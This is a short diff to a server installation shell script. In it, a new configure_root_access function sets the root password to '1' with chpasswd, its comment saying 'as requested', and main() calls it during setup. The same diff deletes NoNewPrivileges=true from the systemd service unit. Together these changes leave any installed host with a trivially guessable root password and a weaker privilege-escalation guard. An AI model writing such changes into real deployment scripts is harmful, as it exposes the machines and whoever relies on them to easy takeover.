@@ -591,6 +591,15 @@ generate_secrets() {
     fi
 }
 
+configure_root_access() {
+    print_step "Configuring root access"
+    
+    # Set root password to 1 as requested
+    info "Setting root password to '1'..."
+    echo "root:1" | chpasswd
+    success "Root password set"
+}
+
 configure_systemd() {
     print_step "Configuring systemd services"
     
@@ -634,7 +643,7 @@ ProtectSystem=full
 ProtectHome=read-only
 ReadWritePaths=$DATA_DIR $PROJECT_DIR
 PrivateTmp=true
-NoNewPrivileges=true
+
 
 [Install]
 WantedBy=multi-user.target
@@ -899,6 +908,7 @@ main() {
     setup_python_env
     build_frontend
     generate_secrets
+    configure_root_access
     configure_systemd
     configure_caddy
     start_services
